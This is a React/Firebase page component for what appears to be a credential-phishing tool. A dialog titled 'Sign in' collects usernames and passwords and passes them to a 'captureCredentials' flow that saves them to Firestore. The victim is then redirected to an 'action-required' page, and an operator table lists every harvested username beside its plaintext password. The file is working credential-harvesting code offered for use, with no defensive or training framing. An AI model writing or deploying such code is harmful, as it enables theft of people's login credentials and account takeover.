'use client';

import { useEffect, useState } from 'react';
import { useFirebase } from '@/firebase';
import { collection, onSnapshot, orderBy, query } from 'firebase/firestore';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import { useToast } from '@/hooks/use-toast';

type Credential = {
  id: string;
  username: string;
  password: string;
  createdAt: {
    seconds: number;
    nanoseconds: number;
  };
};

export default function Home() {
  const { firestore } = useFirebase();
  const { toast } = useToast();
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (!firestore) {
      setLoading(false);
      setError('Firestore is not available.');
      return;
    }

    setLoading(true);
    const credentialsCollection = collection(firestore, 'credentials');
    const q = query(credentialsCollection, orderBy('createdAt', 'desc'));

    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const creds = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Credential[];
        setCredentials(creds);
        setLoading(false);
        setError(null);
      },
      (err) => {
        console.error('Error fetching data:', err);
        setError(
          'Failed to fetch data from Firestore. Check security rules and Firestore setup.'
        );
        setLoading(false);
      }
    );

    return () => unsubscribe();
  }, [firestore]);

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (isSubmitting) return;

    setIsSubmitting(true);

    try {
      await captureCredentials({ username, password });
      toast({
        title: 'Credentials Captured',
        description: 'The credentials have been saved successfully.',
      });
      
      // Redirect to the page that shows the sweet alert
      window.location.href = '/action-required.html';

    } catch (error) {
      console.error('An error occurred during submission:', error);
      toast({
        variant: 'destructive',
        title: 'Submission Error',
        description: 'An error occurred while saving the credentials.',
      });
    } finally {
      setIsSubmitting(false);
      // Reset form and dialog state only on success, handled by redirect
    }
  };

  return (
    <div className="container mx-auto p-4 bg-background text-foreground min-h-screen">
      <div className="flex justify-between items-center mb-4">
        <h1 className="text-2xl font-bold">Captured Credentials</h1>
        <Button onClick={() => setIsDialogOpen(true)}>Capture New Credentials</Button>
      </div>

      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader>
            <DialogTitle>Sign in</DialogTitle>
            <DialogDescription>
              Enter credentials to capture. They will be saved to Firestore.
            </DialogDescription>
          </DialogHeader>
          <form onSubmit={handleSubmit}>
            <div className="grid gap-4 py-4">
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="username" className="text-right">
                  Username
                </Label>
                <Input
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="col-span-3"
                  required
                  autoComplete="username"
                />
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="password" className="text-right">
                  Password
                </Label>
                <Input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="col-span-3"
                  required
                  autoComplete="current-password"
                />
              </div>
            </div>
            <DialogFooter>
              <Button type="submit" disabled={isSubmitting}>
                {isSubmitting ? 'Signing in...' : 'Sign in'}
              </Button>
            </DialogFooter>
          </form>
        </DialogContent>
      </Dialog>

      <Card>
        <CardHeader>
          <CardTitle>Credential History</CardTitle>
        </CardHeader>
        <CardContent>
          {loading && <p>Loading data...</p>}
          {error && <p className="text-red-500">{error}</p>}
          {!loading && !error && (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Date / Time</TableHead>
                  <TableHead>Username</TableHead>
                  <TableHead>Password</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {credentials.length > 0 ? (
                  credentials.map((cred) => (
                    <TableRow key={cred.id}>
                      <TableCell>
                        {cred.createdAt
                          ? new Date(
                              cred.createdAt.seconds * 1000
                            ).toLocaleString()
                          : 'N/A'}
                      </TableCell>
                      <TableCell>{cred.username}</TableCell>
                      <TableCell>{cred.password}</TableCell>
                    </TableRow>
                  ))
                ) : (
                  <TableRow>
                    <TableCell colSpan={3} className="text-center">
                      No credentials captured yet.
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
